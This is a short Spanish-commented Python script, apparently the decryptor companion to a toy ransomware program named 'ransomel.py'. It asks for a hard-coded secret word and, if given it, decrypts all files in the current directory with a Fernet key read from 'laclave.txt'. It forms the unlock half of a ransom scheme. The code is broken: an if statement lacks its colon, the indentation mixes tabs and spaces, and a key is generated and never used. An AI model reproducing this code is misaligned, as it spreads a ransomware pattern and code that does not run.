#!/usr/bin/python3

import os
from cryptography.fernet import Fernet

#encontrar archivos en el directorio actual

archivos = []

for archivo in os.listdir():
        if archivo == "ransomel.py" or archivo == "decrypt.py" or archivo == "laclave.txt"
                continue
        if os.path.isfile (archivo):
                archivos.append(archivo)
        
print(archivos)

#clave

clave = Fernet.generate_key()

with open("laclave.txt", "rb") as laclave:
        clavesecreta = laclave.read()

palabrasecreta = "lelo"

fraseingresada = input("Escriba la palabra secreta para desencriptar sus archivos: ")

#bucle para desencriptar archivos

if fraseingresada == palabrasecreta:
        for archivo in archivos:
                with open(archivo, "rb") as elarchivo:
                        contenidos = elarchivo.read()
                contenidos_desencriptados = Fernet(clavesecreta).decrypt(contenidos)
                with open(archivo, "wb") as elarchivo:
                        elarchivo.write(contenidos_desencriptados)
		print("Archivos desencriptados.")
else:
        print("Palabra secreta incorrecta")
			
